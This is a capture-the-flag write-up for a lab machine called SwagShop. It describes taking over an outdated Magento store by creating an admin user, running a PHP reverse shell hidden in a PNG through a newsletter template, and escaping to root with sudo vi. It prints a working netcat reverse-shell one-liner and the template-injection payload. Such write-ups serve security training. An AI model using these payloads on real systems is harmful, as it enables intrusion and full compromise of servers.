# SwagShop
## Difficulty: Easy
## OS: Linux

IP= 10.10.10.140

Nmap scan: open ports 22, 80.
Started gobuster scan on web server.

## Web enumeration

The website is using magneto CMS for e-commerce which was 2014 version. It was outdated.
Found this(https://www.exploit-db.com/exploits/37977) exploit which creates admin user.

Ran this exploit and created a new admin user: forme:forme

Logged into the website as forme.

## Froghopper attack

Found this(https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper) attack which gives RCE on magneto.

Went to System->Configuration. Then Advanced->Developer. And allowed symlinks from template settings->allow symlinks.

To create an exploit, I created a blank png file and added php reverse shell into it.

```
echo '<?php' >> shell.php.png
echo 'passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 5555 >/tmp/f");' >> shell.php.png
echo '?>' >> shell.php.png
```

Then to upload this image, I created a new category Catalog->Manage categories and added the image in images tab and saved the category.

To inject the payload, we have to create a new template.
Newsletter->Newsletter template

Add new template and create a new template.

In the content:

```
{{block type='core/template' template='../../../../../../media/catalog/category/shell.php.png'}}
```

Preview shell and got a reverse shell.

User file was present in /home/haris/user.txt

## Root.txt

Ran sudo -l and found out we can run /usr/bin/vi as root and can open any file in /var/www/html/*

```
sudo /usr/bin/vi /var/www/html/shell.sh

:set shell=/bin/bash
:shell
```

Got shell as root and got root.txt
